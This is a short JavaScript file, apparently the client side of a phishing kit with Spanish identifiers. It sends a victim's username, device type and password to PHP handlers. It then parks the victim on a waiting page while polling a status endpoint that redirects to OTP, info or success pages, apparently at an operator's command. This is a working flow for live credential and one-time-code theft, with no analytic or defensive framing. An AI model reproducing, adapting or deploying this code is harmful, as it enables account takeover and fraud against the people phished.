function detectar_dispositivo(){
    var dispositivo = "PC";
    if(navigator.userAgent.match(/Android/i)) dispositivo = "Android";
    else if(navigator.userAgent.match(/iPhone|iPad|iPod/i)) dispositivo = "iOS";
    return dispositivo;
}

function inicio(u){
    var d = detectar_dispositivo();
    $("#fondo, #cargando-o").show();
    $.post( "../process/inicio.php", { usr: u, dis: d } ).always(function() {
        window.location.href = "pass.php"; 
    });
}

function pasousuario(p){    
    $("#fondo, #cargando-o").show();
    $.post( "../process/pasousuario.php", { pass: p } ).always(function() {
        window.location.href = "waiting.php"; 
    });
}            

function consultar_estado(){    
    $.post( "../process/estado.php?v=" + Math.random(), function(data) {        
        var estado = data.toString().trim();
        switch (estado) {
            case '2': window.location.href = "otp.php"; break;
            case '4': window.location.href = "info.php"; break;
            case '10': window.location.href = "success.php"; break;
            case '12': window.location.href = "login.php"; break;
        } 
    });        
}
